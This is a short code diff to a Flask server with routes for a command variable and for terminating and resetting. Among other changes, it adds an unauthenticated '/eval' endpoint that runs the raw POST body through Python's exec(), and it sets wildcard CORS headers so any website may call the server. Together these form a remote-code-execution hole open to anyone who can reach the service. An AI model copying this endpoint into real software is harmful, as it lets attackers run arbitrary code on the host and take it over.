@@ -13,6 +13,21 @@ queue: list = [
 
 cmd = "none"
 
+@app.after_request
+def add_headers(response: flask.Response):
+    # Take care of preflight post request
+    if flask.request.method == 'OPTIONS':
+        response.headers['Access-Control-Allow-Methods'] = 'GET, POST, PUT, DELETE'
+        response.headers['Access-Control-Allow-Headers'] = 'Content-Type, Access-Control-Allow-Origin'
+        response.headers['Access-Control-Max-Age'] = '300'
+    response.headers["Access-Control-Allow-Origin"] = "*"
+    return response
+
+@app.route('/', defaults={'path': ''}, methods=['OPTIONS'])
+@app.route('/<path:path>', methods=['OPTIONS'])
+def catch_all(path):
+  return ""
+
 @app.route("/terminate")
 def terminate():
     global cmd, terminated
@@ -24,6 +39,11 @@ def unterminate():
     global terminated
     terminated = False
     return "Back up!"
+
+@app.route("/eval", methods=["POST"])
+def eval_code():
+    out = exec(flask.request.get_data())
+    return str(out)
 
 @app.route("/reset")
 def reset():
